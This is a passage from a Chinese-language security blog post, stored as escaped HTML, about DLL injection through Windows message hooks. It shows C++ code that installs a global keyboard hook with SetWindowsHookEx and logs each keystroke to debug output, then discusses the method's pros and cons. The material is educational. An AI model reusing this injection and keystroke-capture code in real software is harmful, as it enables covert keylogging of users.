class=\"line\">\t::<span class=\"built_in\">OutputDebugString</span>(<span class=\"string\">&quot;[+] GetProcAddress(hMod, \\&quot;HookKeyboardProc\\&quot;) success&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t*g_pHook = ::<span class=\"built_in\">SetWindowsHookEx</span>(</span><br><span class=\"line\">\t\tWH_KEYBOARD,</span><br><span class=\"line\">\t\tHookKeyboardProc,</span><br><span class=\"line\">\t\thMod,</span><br><span class=\"line\">\t\t<span class=\"number\">0</span></span><br><span class=\"line\">\t);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!*g_pHook) </span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::<span class=\"built_in\">OutputDebugString</span>(<span class=\"string\">&quot;[+] SetWindowsHookEx faild&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">FreeLibrary</span>(hMod);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t::<span class=\"built_in\">OutputDebugString</span>(<span class=\"string\">&quot;[+] SetWindowsHookEx success&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[+] Start hook keyboard message, wait for exit\\r\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">system</span>(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">UnhookWindowsHookEx</span>(*g_pHook);</span><br><span class=\"line\">\t::<span class=\"built_in\">OutputDebugString</span>(<span class=\"string\">&quot;[+] UnhookWindowsHookEx&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[+] End hook keyboard message, exit\\r\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>HookDll:</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\">HOOKDLL_API HHOOK g_hook = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"><span class=\"function\">HOOKDLL_API LRESULT CALLBACK <span class=\"title\">HookKeyboardProc</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    <span class=\"keyword\">int</span> code,       <span class=\"comment\">// hook code</span></span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    WPARAM wParam,  <span class=\"comment\">// virtual-key code</span></span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    LPARAM lParam   <span class=\"comment\">// keystroke-message information</span></span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (code &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">CallNextHookEx</span>(</span><br><span class=\"line\">            g_hook,</span><br><span class=\"line\">            code,</span><br><span class=\"line\">            wParam,</span><br><span class=\"line\">            lParam);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">char</span> szBuff[MAXBYTE] = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">    <span class=\"built_in\">wsprintf</span>(szBuff, <span class=\"string\">&quot;Hook：%c &quot;</span>, wParam);</span><br><span class=\"line\">    <span class=\"built_in\">OutputDebugString</span>(szBuff);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">CallNextHookEx</span>(</span><br><span class=\"line\">        g_hook,</span><br><span class=\"line\">        code,</span><br><span class=\"line\">        wParam,</span><br><span class=\"line\">        lParam);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"0x4-优缺点\"><a href=\"#0x4-优缺点\" class=\"headerlink\" title=\"0x4 优缺点\"></a>0x4 优缺点</h1><h2 id=\"1-优点\"><a href=\"#1-优点\" class=\"headerlink\" title=\"1. 优点\"></a>1. 优点</h2><ul>\n<li>和利用注册表来注入DLL的方法相比，这种方法允许我们在不需要该DLL的时候从进程的地址空间中撤销对它的映射，只需要调用UnhookWindowsHookEx就可以达到目的。当一个线程调用UnhookWindowsHookEx的时候，系统会遍历自己内部的一个已经注入过该DLL的进程列表，并将该DLL的锁计数器递减。当锁计数器减到0的时候，系统会自动从进程的地址空间中撤销对该DLL的映射</li>\n<li>这种方式可以理解为借用了windows自己原生的机制来进行DLL注入，注入过程比较稳定</li>\n<li>当系统把<strong>挂钩过滤函数（hook filter function）</strong>所对应的DLL注入或映射到地址空间中时，会映射整个DLL，而不仅仅只是挂钩过滤函数，这意味着该DLL内的所有函数存在于被注入的进程中，能够被被注入进程中的任何线程调用。</li>\n</ul>\n<h2 id=\"2-缺点\"><a href=\"#2-缺点\" class=\"headerlink\" title=\"2. 缺点\"></a>2. 缺点</h2><ul>\n<li>系统为了防止内存访问违规，在被注入进程指定Hook函数的时候，会对注入DLL的锁计数器加1，因为如果不这么做，则被注入进程在执行Hook函数的时候，系统的另一个进程可能会调用UnhookWindowsHookEx，从而引起内存访问违规。这导致我们不能在调用了Hook函数，且函数还在运行时把挂钩清除，在Hook函数执行的整个生命周期，这个挂钩必须一直有效。</li>\n</ul>\n<h1 id=\"0x5-参考链接\"><a href=\"#0x5-参考链接\" class=\"headerlink\" title=\"0x5 参考链接\"></a>0x5 参考链接</h1><blockquote>\n<p><a href=\"https://www.cnblogs.com/LittleHann/p/6336950.html\">https://www.cnblogs.com/LittleHann/p/6336950.html</a></p>\n</blockquote>\n","categories":["Security"],"tags":["windows"]}]